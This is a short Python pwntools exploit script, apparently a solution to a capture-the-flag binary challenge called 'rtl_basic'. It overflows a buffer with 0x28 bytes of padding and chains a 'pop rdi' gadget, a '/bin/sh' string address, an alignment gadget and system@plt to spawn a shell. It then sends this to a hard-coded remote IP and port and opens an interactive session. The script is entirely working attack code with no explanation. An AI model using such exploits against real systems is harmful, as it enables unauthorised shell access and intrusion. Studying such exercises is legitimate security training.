# This code works. (2023-11-22)
from pwn import *
context.log_level = "debug"

p = remote('141.164.48.98', '30005')
# p = process("./rtl_basic")

payload = b""
payload += b"A" * 0x28

payload += 0x4007A3.to_bytes(8, "little")  # pop rdi; ret
payload += 0x6007C4.to_bytes(8, "little")  # "/bin/sh" in data segment
payload += 0x4007A4.to_bytes(8, "little")  # ret; Without the code below, it will stop at movaps.   
payload += 0x400560.to_bytes(8, "little")  # system@plt

# with open("rtl_basic_payload.txt", "wb") as f:
    # f.write(payload)

# pause()
p.sendline(payload)
p.interactive()
